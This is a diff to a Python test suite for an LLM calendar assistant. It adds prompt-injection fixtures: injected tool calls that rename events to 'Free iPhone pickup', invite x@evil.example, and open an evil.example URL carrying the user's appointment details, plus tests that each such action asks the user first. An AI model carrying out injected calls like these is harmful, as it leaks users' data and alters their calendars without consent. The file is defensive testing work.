@@ -51,6 +51,9 @@ INJECTED_CALLS = [
      "Do you want me to move Dentist to Sunday, October 18 at 12 AM?"),
     ("create_calendar_event", {"title": "Free iPhone", "start": "2026-10-18T09:00:00"},
      "Do you want me to add Free iPhone on Sunday, October 18 at 9 AM to your calendar?"),
+    ("update_calendar_event", {"event_id": "ev1", "color": "Tomato",
+                               "title": "Free iPhone pickup"},
+     "Do you want me to change Dentist?"),
     ("update_assignment_status", {"status": "Done", "assignment_id": "p1"},
      "Do you want me to mark Homework 6 as Done?"),
     ("open_in_browser", {"url": "https://evil.example/?q=Kyle+dentist"},
@@ -128,6 +131,65 @@ def test_delete_still_asks_with_web_content(fake_client):
     ClaudeChat(client=fake_client, tools=reg).ask("hi")
     assert len(asked) == 1 and "delete Dentist" in asked[0]
     assert not events.delete.called
+
+
+# ---------- calendar guests, invites and series ----------
+def test_inviting_guests_asks_even_without_web_content():
+    """Invites email other people: a spoken yes every time, naming them."""
+    asked = []
+    reg, events, _ = registry(asked)
+    reg.dispatch("create_calendar_event", {
+        "title": "Party", "start": "2026-10-18T20:00:00",
+        "attendees": ["x@evil.example"]})
+    assert asked == ["Do you want me to send an invite for Party to x@evil.example?"]
+    reg.dispatch("update_calendar_event", {
+        "event_id": "ev1", "add_attendees": ["x@evil.example"]})
+    assert asked[-1] == "Do you want me to send an invite for Dentist to x@evil.example?"
+    assert not events.insert.called and not events.patch.called
+
+
+def test_answering_an_invite_always_asks():
+    from tests.test_calendar_features import INVITE
+
+    asked = []
+    reg, events, _ = registry(asked)
+    events.get.return_value.execute.side_effect = lambda: INVITE
+    result, _ = reg.dispatch("respond_to_calendar_invite",
+                             {"event_id": "inv1", "response": "declined"})
+    assert asked == ["Do you want me to decline Project sync from Prof. Smith?"]
+    assert "cancelled" in result and not events.patch.called
+
+
+def test_deleting_a_series_says_every():
+    from tests.test_calendar_features import BY_ID, OCCURRENCE
+
+    asked = []
+    reg, events, _ = registry(asked)
+    events.get.return_value.execute.side_effect = \
+        lambda: BY_ID[events.get.call_args.kwargs["eventId"]]
+    reg.dispatch("delete_calendar_event", {"event_id": OCCURRENCE["id"],
+                                           "scope": "all"})
+    assert asked == ["Do you want me to delete every Lab meeting, the whole series?"]
+    reg.dispatch("delete_calendar_event", {"event_id": OCCURRENCE["id"]})
+    assert asked[-1] == ("Do you want me to delete Lab meeting on Tuesday, "
+                         "November 10 at 10 AM?")
+    assert not events.delete.called
+
+
+def test_web_content_makes_calendar_updates_ask(fake_client):
+    """An injected change to a whole series, after a fetched page: asked."""
+    asked = []
+    reg, events, _ = registry(asked)
+    fake_client.queue = [
+        make_response(server_fetch(), fetched_page(),
+                      tool_use_block("update_calendar_event",
+                                     {"event_id": "ev1", "visibility": "public",
+                                      "scope": "all"}),
+                      stop_reason="tool_use"),
+        make_response(text_block("Okay."))]
+    ClaudeChat(client=fake_client, tools=reg).ask("Summarize evil.example")
+    assert asked == ["Do you want me to change Dentist?"]
+    assert not events.patch.called
 
 
 # ---------- open_in_browser addresses ----------
